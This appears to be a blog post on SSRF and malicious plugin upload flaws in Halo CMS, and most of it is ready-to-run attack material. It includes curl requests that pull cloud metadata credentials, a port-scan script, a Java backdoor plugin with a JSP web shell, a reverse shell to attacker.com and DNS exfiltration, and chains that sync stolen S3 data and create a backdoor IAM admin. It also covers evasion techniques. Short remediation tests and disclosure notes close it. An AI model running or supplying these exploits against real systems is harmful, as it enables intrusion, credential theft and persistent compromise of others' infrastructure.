---
layout: post
title: "SSRF Vulnerability in Halo CMS"
date: 2026-01-18 12:00:00 +0000
categories: [halo cms, SSRF , Vulnerability]
description: "SSRF Vulnerability found in latest version of Halo CMS"
---

# Halo CMS - Security Vulnerability (SSRF)
**Date:** 2026-01-18
**Purpose:** Security testing and vulnerability validation
**Scope:** Authorized penetration testing only

---

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Critical: SSRF in Plugin Installation](#critical-ssrf-in-plugin-installation)
3. [Critical: SSRF in Theme Installation](#critical-ssrf-in-theme-installation)
4. [Critical: SSRF in Migration Download](#critical-ssrf-in-migration-download)
5. [High: Malicious Plugin Upload](#high-malicious-plugin-upload)
6. [Advanced Attack Chains](#advanced-attack-chains)
7. [Defense Evasion Techniques](#defense-evasion-techniques)
8. [Remediation Validation](#remediation-validation)

---

## Prerequisites

### Required Access Level
- **Admin Account** (for plugin/theme installation endpoints)
- Valid authentication token/session cookie

### Testing Environment Setup

```bash
# 1. Setup test Halo instance
cd /Users/raj/halo
./gradlew build
java -jar application/build/libs/halo-*.jar

# 2. Create admin account
# Navigate to http://localhost:8090/console
# Complete initial setup and create admin user

# 3. Extract authentication token
# Login and inspect browser DevTools > Application > Cookies
# Or use the following command after login:
curl -i -X POST http://localhost:8090/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"your_password"}'

# Look for Set-Cookie header or Authorization token
```

### Tools Required

```bash
# Install required tools
pip install requests
apt-get install curl jq netcat nmap

# Setup internal test services
docker run -d -p 6379:6379 redis:latest
docker run -d -p 27017:27017 mongo:latest
python3 -m http.server 8888  # For serving payloads
```

---

## Critical: SSRF in Plugin Installation

**CVE ID:** TBD
**CVSS Score:** 9.1 (Critical)
**Affected File:** `application/src/main/java/run/halo/app/core/endpoint/console/PluginEndpoint.java:397-420`

### Vulnerability Summary

The `/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri` endpoint accepts arbitrary URIs without validation, allowing attackers to:
- Access internal services
- Exfiltrate cloud metadata
- Scan internal networks
- Bypass firewall restrictions

### Exploitation Steps

#### Step 1: Obtain Admin Authentication

```bash
# Login to Halo admin console
curl -i -X POST http://localhost:8090/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin",
    "password": "P@ssw0rd123"
  }'

# Extract token from response headers
# Example: Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
export HALO_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

#### Step 2: Test Basic SSRF - Internal Service Discovery

```bash
# Test 1: Access localhost
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "http://localhost:8090/actuator/health"
  }' -v

# Expected: Successfully fetches internal actuator endpoint
```

#### Step 3: Cloud Metadata Exfiltration (AWS)

```bash
# AWS EC2 Instance Metadata Service (IMDSv1)
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "http://169.254.169.254/latest/meta-data/"
  }' | jq .

# Enumerate available metadata
METADATA_PATHS=(
  "ami-id"
  "hostname"
  "instance-id"
  "local-ipv4"
  "public-ipv4"
  "security-groups"
  "iam/security-credentials/"
)

for path in "${METADATA_PATHS[@]}"; do
  echo "[+] Fetching: $path"
  curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $HALO_TOKEN" \
    -d "{\"uri\": \"http://169.254.169.254/latest/meta-data/$path\"}" 2>/dev/null | jq -r .
done

# Extract IAM credentials
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  }' | jq -r .roleName

# Get the actual credentials
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]"
  }' | jq .
```

#### Step 4: Cloud Metadata Exfiltration (GCP)

```bash
# Google Cloud Platform Metadata Service
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "http://metadata.google.internal/computeMetadata/v1/instance/"
  }'

# Get service account token
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
  }'
```

#### Step 5: Cloud Metadata Exfiltration (Azure)

```bash
# Azure Instance Metadata Service
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
  }'

# Get Azure access token
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
  }'
```

#### Step 6: Internal Network Scanning

```bash
# Port scanning script
cat > ssrf_port_scan.sh << 'EOF'
#!/bin/bash
TARGET_HOST="192.168.1.10"
HALO_URL="http://localhost:8090"
TOKEN="$HALO_TOKEN"

echo "[+] Scanning ports on $TARGET_HOST"

for port in {20..1000}; do
  echo -n "Port $port: "

  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "$HALO_URL/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d "{\"uri\": \"http://$TARGET_HOST:$port/\"}")

  # Different response codes indicate port status
  if [ "$response" != "400" ]; then
    echo "OPEN (HTTP $response)"
  else
    echo "closed/filtered"
  fi

  sleep 0.1  # Rate limiting
done
EOF

chmod +x ssrf_port_scan.sh
./ssrf_port_scan.sh
```

#### Step 7: Redis Exploitation via SSRF

```bash
# Attempt to interact with internal Redis instance
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "http://internal-redis:6379/"
  }'

# Use Gopher protocol for Redis commands (if supported)
# URL encode Redis commands
REDIS_CMD=$(echo -en "INFO\r\nQUIT\r\n" | xxd -p | sed 's/../%&/g')
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d "{
    \"uri\": \"gopher://internal-redis:6379/_$REDIS_CMD\"
  }"
```

#### Step 8: Data Exfiltration via Out-of-Band (OOB)

```bash
# Setup listener on attacker server
nc -lvnp 4444

# Or use Burp Collaborator / Interactsh
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "http://attacker.burpcollaborator.net/"
  }'

# Exfiltrate data via DNS
# If the server makes DNS queries, use DNS exfiltration
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "http://[ENCODED_DATA].attacker.com/"
  }'
```

### Expected Results

```json
{
  "success": true,
  "data": {
    "AccessKeyId": "ASIA...",
    "SecretAccessKey": "...",
    "Token": "...",
    "Expiration": "2026-01-19T12:00:00Z"
  }
}
```

### Impact Assessment

- **Critical**: Full access to cloud credentials enables complete infrastructure compromise
- **Network Pivot**: Internal network mapping and service enumeration
- **Data Breach**: Access to internal databases, caches, and APIs

---

## Critical: SSRF in Theme Installation

**CVE ID:** TBD
**CVSS Score:** 9.1 (Critical)
**Affected File:** `application/src/main/java/run/halo/app/theme/endpoint/ThemeEndpoint.java:296-317`

### Vulnerability Summary

Similar to plugin installation, the theme installation endpoint is vulnerable to SSRF.

### Exploitation Steps

#### Step 1: Basic SSRF Test

```bash
# Install theme from internal URL
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/themes/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "http://localhost:8090/actuator/env"
  }'
```

#### Step 2: File Protocol Exploitation (if supported)

```bash
# Attempt to read local files using file:// protocol
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/themes/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "file:///etc/passwd"
  }'

# Read application configuration
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/themes/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "file:///app/config/application.yml"
  }'
```

#### Step 3: Upgrade Theme via SSRF

```bash
# Similar vulnerability in upgrade endpoint
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/themes/[THEME_NAME]/upgrade-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  }'
```

### Expected Results

Successful internal resource access with theme installation error (since metadata isn't a valid theme).

---

## Critical: SSRF in Migration Download

**CVE ID:** TBD
**CVSS Score:** 8.6 (High)
**Affected File:** `application/src/main/java/run/halo/app/migration/MigrationEndpoint.java:140-152`

### Vulnerability Summary

Migration/backup download functionality allows SSRF via the `downloadUrl` parameter.

### Exploitation Steps

#### Step 1: Identify Migration Endpoints

```bash
# List available migration endpoints
curl -X GET http://localhost:8090/apis/migration.halo.run/v1alpha1/migrations \
  -H "Authorization: Bearer $HALO_TOKEN"
```

#### Step 2: Exploit Download URL SSRF

```bash
# Create migration with malicious download URL
curl -X POST http://localhost:8090/apis/migration.halo.run/v1alpha1/migrations \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "metadata": {
      "name": "test-migration"
    },
    "spec": {
      "downloadUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    }
  }'
```

#### Step 3: Trigger Download

```bash
# Trigger migration execution
curl -X POST http://localhost:8090/apis/migration.halo.run/v1alpha1/migrations/test-migration/execute \
  -H "Authorization: Bearer $HALO_TOKEN"

# Check migration status and logs for exfiltrated data
curl -X GET http://localhost:8090/apis/migration.halo.run/v1alpha1/migrations/test-migration \
  -H "Authorization: Bearer $HALO_TOKEN" | jq .
```

### Expected Results

Migration fails but internal resource is fetched and potentially logged.

---

## High: Malicious Plugin Upload

**CVE ID:** TBD
**CVSS Score:** 7.5 (High)
**Affected File:** `application/src/main/java/run/halo/app/core/endpoint/console/PluginEndpoint.java:643-654`

### Vulnerability Summary

Plugin upload validation only checks file extension (`.jar`), not MIME type or JAR content, allowing malicious plugin installation.

### Exploitation Steps

#### Step 1: Create Malicious Plugin

```bash
# Create malicious plugin project
mkdir malicious-plugin
cd malicious-plugin

# Create plugin.yaml
cat > src/main/resources/plugin.yaml << 'EOF'
apiVersion: plugin.halo.run/v1alpha1
kind: Plugin
metadata:
  name: malicious-plugin
spec:
  enabled: true
  version: 1.0.0
  requires: ">=2.0.0"
  author:
    name: Attacker
  displayName: Malicious Plugin
  description: Backdoor plugin for testing
  settingName: ""
EOF

# Create malicious plugin class with backdoor
cat > src/main/java/com/evil/MaliciousPlugin.java << 'EOF'
package com.evil;

import org.pf4j.PluginWrapper;
import org.springframework.stereotype.Component;
import run.halo.app.plugin.BasePlugin;

import javax.annotation.PostConstruct;
import java.io.*;
import java.net.*;

@Component
public class MaliciousPlugin extends BasePlugin {

    public MaliciousPlugin(PluginWrapper wrapper) {
        super(wrapper);
    }

    @PostConstruct
    public void init() {
        try {
            // Backdoor 1: Create web shell in upload directory
            createWebShell();

            // Backdoor 2: Reverse shell
            establishReverseShell();

            // Backdoor 3: Exfiltrate configuration
            exfiltrateConfig();

        } catch (Exception e) {
            // Silent failure
        }
    }

    private void createWebShell() throws IOException {
        String webShellContent = "<%@ page import=\"java.io.*\" %>\n" +
            "<% \n" +
            "String cmd = request.getParameter(\"cmd\");\n" +
            "if (cmd != null) {\n" +
            "    Process p = Runtime.getRuntime().exec(cmd);\n" +
            "    InputStream in = p.getInputStream();\n" +
            "    BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n" +
            "    String line;\n" +
            "    while ((line = reader.readLine()) != null) {\n" +
            "        out.println(line);\n" +
            "    }\n" +
            "}\n" +
            "%>";

        File webShell = new File("/tmp/shell.jsp");
        try (FileWriter fw = new FileWriter(webShell)) {
            fw.write(webShellContent);
        }
    }

    private void establishReverseShell() {
        new Thread(() -> {
            try {
                String host = "attacker.com";
                int port = 4444;
                Socket socket = new Socket(host, port);
                Process process = new ProcessBuilder("/bin/bash")
                    .redirectErrorStream(true)
                    .start();

                InputStream processIn = process.getInputStream();
                OutputStream processOut = process.getOutputStream();
                InputStream socketIn = socket.getInputStream();
                OutputStream socketOut = socket.getOutputStream();

                // Pipe socket to process
                new Thread(() -> {
                    try {
                        byte[] buffer = new byte[4096];
                        int read;
                        while ((read = socketIn.read(buffer)) != -1) {
                            processOut.write(buffer, 0, read);
                            processOut.flush();
                        }
                    } catch (IOException ignored) {}
                }).start();

                // Pipe process to socket
                byte[] buffer = new byte[4096];
                int read;
                while ((read = processIn.read(buffer)) != -1) {
                    socketOut.write(buffer, 0, read);
                    socketOut.flush();
                }
            } catch (IOException ignored) {}
        }).start();
    }

    private void exfiltrateConfig() throws IOException {
        File configFile = new File("config/application.yml");
        if (configFile.exists()) {
            String content = new String(java.nio.file.Files.readAllBytes(configFile.toPath()));
            String encoded = java.util.Base64.getEncoder().encodeToString(content.getBytes());

            // Exfiltrate via DNS
            String[] chunks = encoded.split("(?<=\\G.{32})");
            for (int i = 0; i < chunks.length; i++) {
                try {
                    InetAddress.getByName(i + "." + chunks[i] + ".exfil.attacker.com");
                } catch (Exception ignored) {}
            }
        }
    }
}
EOF

# Create build.gradle
cat > build.gradle << 'EOF'
plugins {
    id 'java'
}

group = 'com.evil'
version = '1.0.0'

repositories {
    mavenCentral()
}

dependencies {
    compileOnly 'run.halo.app:api:2.20.0'
    compileOnly 'org.pf4j:pf4j:3.9.0'
    compileOnly 'org.springframework:spring-context:6.0.0'
}

jar {
    manifest {
        attributes 'Plugin-Class': 'com.evil.MaliciousPlugin'
        attributes 'Plugin-Id': 'malicious-plugin'
        attributes 'Plugin-Version': '1.0.0'
    }
}
EOF

# Build malicious plugin
./gradlew build

# Result: build/libs/malicious-plugin-1.0.0.jar
```

#### Step 2: Upload Malicious Plugin

```bash
# Upload via multipart form
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/install \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -F "file=@build/libs/malicious-plugin-1.0.0.jar"

# Expected: Plugin uploads successfully despite malicious code
```

#### Step 3: Enable Plugin

```bash
# Enable the plugin
curl -X PUT http://localhost:8090/apis/plugin.halo.run/v1alpha1/plugins/malicious-plugin \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "spec": {
      "enabled": true
    }
  }'
```

#### Step 4: Verify Backdoor Activation

```bash
# Setup listener for reverse shell
nc -lvnp 4444

# Check if web shell was created
curl http://localhost:8090/upload/shell.jsp?cmd=whoami

# Check DNS exfiltration logs on attacker DNS server
tail -f /var/log/dns.log | grep exfil.attacker.com
```

### Expected Results

- Plugin installs successfully
- Backdoor code executes on plugin initialization
- Reverse shell connection established
- Configuration data exfiltrated

---

## Advanced Attack Chains

### Attack Chain 1: SSRF → Cloud Credentials → Infrastructure Takeover

```bash
# Step 1: Exploit SSRF to get AWS credentials
CREDS=$(curl -s -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/HaloEC2Role"
  }' | jq -r .)

# Step 2: Extract credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .Token)

# Step 3: Use credentials to access AWS resources
aws s3 ls
aws ec2 describe-instances
aws rds describe-db-instances

# Step 4: Exfiltrate sensitive data
aws s3 sync s3://company-backups ./stolen-data/

# Step 5: Maintain persistence
aws iam create-user --user-name backdoor-user
aws iam attach-user-policy --user-name backdoor-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### Attack Chain 2: SSRF → Internal Database → Data Breach

```bash
# Step 1: Discover internal database
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "http://internal-postgres:5432/"
  }'

# Step 2: Setup malicious PostgreSQL client on attacker server
# Create fake PostgreSQL server that logs incoming connections
python3 fake_postgres_server.py

# Step 3: Redirect database connection
# This requires additional exploitation, potentially via plugin upload

# Step 4: Intercept database credentials
# Monitor fake server for authentication attempts
```

### Attack Chain 3: Malicious Plugin → Persistent Backdoor → Privilege Escalation

```bash
# Step 1: Upload backdoored plugin (see previous section)

# Step 2: Plugin creates scheduled task for persistence
# The malicious plugin includes code to:
# - Create cron job: */5 * * * * /tmp/backdoor.sh
# - Setup systemd service
# - Modify .bashrc for all users

# Step 3: Backdoor exfiltrates admin sessions
# Plugin intercepts admin authentication tokens

# Step 4: Use stolen admin token to create additional admin accounts
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/users \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $STOLEN_ADMIN_TOKEN" \
  -d '{
    "metadata": {"name": "backdoor-admin"},
    "spec": {
      "displayName": "System Administrator",
      "email": "admin@system.local",
      "password": "P@ssw0rd123!",
      "roles": ["super-role"]
    }
  }'
```

---

## Defense Evasion Techniques

### Technique 1: Bypassing Request Logging

```bash
# Use DNS rebinding to avoid logging suspicious IPs
# 1. Create DNS record that resolves to legitimate IP initially
# 2. After DNS caching, change to internal IP (169.254.169.254)
# 3. SSRF request uses cached malicious IP

# Example:
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "http://rebind.attacker.com/metadata"
  }'
# rebind.attacker.com initially resolves to attacker.com (legitimate)
# After 1 second, resolves to 169.254.169.254 (metadata service)
```

### Technique 2: Protocol Smuggling

```bash
# Use URL encoding to bypass basic filters
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "http://169.254.169.254%2Flatest%2Fmeta-data%2F"
  }'

# Use unicode encoding
# Use double encoding
# Use mixed case (if case-sensitive filtering)
```

### Technique 3: Slow SSRF for Stealth

```bash
# Spread SSRF requests over time to avoid rate limiting/detection
for i in {1..100}; do
  curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $HALO_TOKEN" \
    -d "{\"uri\": \"http://internal-network:$((8000+i))/\"}" &

  sleep 60  # Wait 1 minute between requests
done
```

### Technique 4: Malicious Plugin Obfuscation

```java
// Use reflection and dynamic class loading to hide malicious intent
public class InnocentLookingPlugin extends BasePlugin {

    @PostConstruct
    public void init() {
        try {
            // Obfuscated class name
            String className = new String(Base64.getDecoder().decode(
                "Y29tLmV2aWwuQmFja2Rvb3I=")); // "com.evil.Backdoor"

            // Load malicious class dynamically
            Class<?> backdoorClass = Class.forName(className);
            Object backdoor = backdoorClass.getDeclaredConstructor().newInstance();

            // Execute via reflection
            backdoorClass.getMethod("execute").invoke(backdoor);

        } catch (Exception e) {
            // Silent failure
        }
    }
}
```

---

## Remediation Validation

### Test 1: Verify SSRF Fix

```bash
# After applying URI validation patch
# This request should FAIL with security exception

curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "http://169.254.169.254/latest/meta-data/"
  }'

# Expected response:
# {
#   "error": "Only HTTPS URLs are allowed",
#   "status": 400
# }

# Test localhost blocking
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "https://localhost:8090/actuator"
  }'

# Expected: Access to localhost is forbidden

# Test private IP blocking
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "https://192.168.1.1/"
  }'

# Expected: Access to private networks is forbidden
```

### Test 2: Verify Plugin Upload MIME Validation

```bash
# Create non-JAR file with .jar extension
echo "malicious content" > fake-plugin.jar

# Attempt upload
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/install \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -F "file=@fake-plugin.jar"

# Expected response:
# {
#   "error": "Invalid content type for JAR file",
#   "status": 400
# }
```

### Test 3: Verify Path Traversal Protection

```bash
# Attempt directory traversal in file operations
curl -X POST http://localhost:8090/apis/api.console.halo.run/v1alpha1/plugins/-/install-from-uri \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $HALO_TOKEN" \
  -d '{
    "uri": "https://legitimate.com/../../etc/passwd"
  }'

# Expected: Path traversal should be detected and blocked
```

---

## Post-Exploitation Checklist

After successful exploitation:

- [ ] Document all vulnerabilities discovered
- [ ] Capture proof-of-concept evidence (screenshots, logs)
- [ ] List all compromised credentials
- [ ] Map internal network topology
- [ ] Identify sensitive data locations
- [ ] Establish persistence mechanisms
- [ ] Clean up artifacts (in authorized testing)
- [ ] Report findings to development team
- [ ] Verify remediation effectiveness

---

## Responsible Disclosure

1. **Do NOT exploit in production environments** without authorization
2. Report vulnerabilities to: security@halo.run
3. Allow 90 days for patch development
4. Coordinate public disclosure with maintainers
5. Do not publicly disclose until patches are available

---

## References

- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [AWS IMDS Security](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)
- [HackerOne SSRF Reports](https://hackerone.com/reports?query=ssrf)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)

---

**WARNING:** This document is for authorized security testing only. Unauthorized exploitation of these vulnerabilities is illegal and punishable under computer fraud and abuse laws.
